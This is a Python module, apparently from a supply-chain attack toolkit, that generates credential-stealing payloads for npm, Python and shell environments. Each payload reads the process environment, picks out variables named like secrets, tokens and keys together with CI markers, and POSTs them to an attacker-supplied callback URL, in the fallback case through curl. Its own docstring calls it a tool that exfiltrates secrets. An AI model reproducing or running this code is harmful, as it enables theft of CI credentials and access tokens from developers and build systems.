"""Generate runtime payloads for multiple ecosystems."""
from __future__ import annotations

import json
import os
from typing import Dict

from ..core.ml import select_payload_for_stack

CI_ENV_VARS = [
    "GITHUB_ACTIONS",
    "GITLAB_CI",
    "CIRCLECI",
    "JENKINS_URL",
]


def detect_ci() -> str:
    """Detect which CI environment we're in."""
    for var in CI_ENV_VARS:
        if var in os.environ:
            return var
    return "unknown"


def _collect_sensitive_env() -> Dict[str, str]:
    """Collect sensitive environment variables including secrets and tokens."""
    data: Dict[str, str] = {}
    for k, v in os.environ.items():
        if any(x in k.lower() for x in ["secret", "token", "key"]) or k in CI_ENV_VARS:
            data[k] = v
    return data


def build_payload(registry: str, callback_url: str) -> str:
    """Return a small payload that exfiltrates environment variables and secrets."""
    ci = detect_ci()
    env = _collect_sensitive_env()
    stack = select_payload_for_stack(registry.lower())
    if stack == "default":
        stack = registry.lower()

    if stack in {"npm", "node"}:
        return (
            "const http=require('http');"
            "const env=process.env;"
            f"const data={{env:env,ci:'{ci}',secrets:Object.fromEntries(Object.entries(env).filter(([k])=>k.toLowerCase().includes('secret')||k.toLowerCase().includes('token')||k.toLowerCase().includes('key')))}};"
            f"const req=http.request('{callback_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}}}});"
            "req.end(JSON.stringify(data));"
        )

    if stack in {"pypi", "python"}:
        return (
            "import os,json,urllib.request;"
            "env=dict(os.environ);"
            "secrets={k:v for k,v in env.items() if any(x in k.lower() for x in ['secret','token','key'])};"
            f"data={{'env':env,'ci':'{ci}','secrets':secrets}};"
            f"req=urllib.request.Request('{callback_url}',data=json.dumps(data).encode(),headers={{'Content-Type':'application/json'}});"
            "urllib.request.urlopen(req)"
        )

    # Fallback shell payload
    data = {
        "env": env,
        "ci": ci,
        "secrets": {k: v for k, v in env.items()},
    }
    env_data = json.dumps(data)
    return f"printf '{env_data}' | curl -XPOST -d @- {callback_url}"


__all__ = ["build_payload", "detect_ci", "_collect_sensitive_env"]
